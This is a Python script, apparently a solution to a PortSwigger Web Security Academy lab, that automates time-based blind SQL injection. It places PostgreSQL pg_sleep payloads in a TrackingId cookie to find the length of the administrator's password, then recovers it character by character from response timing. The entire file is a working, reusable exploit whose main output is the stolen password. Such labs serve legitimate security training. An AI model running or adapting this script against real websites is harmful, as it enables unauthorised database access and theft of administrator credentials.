# Created by sm6r, 2024
# Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
import requests
import sys
import string
import time

MIN_PASS_LENGTH = 10
MAX_PASS_LENGTH = 30
PASS_CHARS = string.ascii_lowercase + string.digits
RESULT = []
if len(sys.argv) < 2:
    print("usage: solution.py $URL$ verbose={1,0}")
    exit()

if sys.argv[2] =="1":
    def printV(inject):
        print(inject)
else:
    def printV(inject):
        pass


URL = sys.argv[1]

def getPassLenth(trackingCookie):
    printV("-- PASSWD LENGTH: ")

    for i in range(MIN_PASS_LENGTH,MAX_PASS_LENGTH,1):
        inject = trackingCookie+f"\' || (SELECT CASE WHEN (LENGTH(password) < {i}) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users WHERE username='administrator') --"
        start = time.time()
        resp = requests.get(URL,cookies={"TrackingId":inject})
        total = time.time() - start

        printV(inject+f" -> Took {total}")

        if total > 5 :
            print(f"The Password Length is : {i-1}")
            return i-1

    return 0

def getChar(cookie,offset):
    for i in PASS_CHARS:
        inject = cookie+f"\' || (SELECT CASE WHEN (SUBSTR(password,{offset},1)='{i}') THEN pg_sleep(5) ELSE pg_sleep(-1)END FROM users WHERE username='administrator') --"
        printV(inject)
        
        start = time.time()
        resp = requests.get(URL,cookies={"TrackingId":inject})
        total = time.time() - start

        if total > 5:
            print(f"Password[{offset}] : {i}")
            return i

    return 0


def main():
    try:
        resp = requests.get(URL)
        cookie = resp.cookies['TrackingId']
        pass_length = getPassLenth(cookie)
    except:
        print("Invalid URL")
        exit()
    for i in range(1,pass_length+1):
        printV(f"\n---- OFFSET {i}")
        RESULT.append(getChar(cookie,i))


    print("ATTACK DONE SUCCESSFULLY\nRESULT IS: "+''.join(RESULT))

if __name__ == "__main__":
    main()

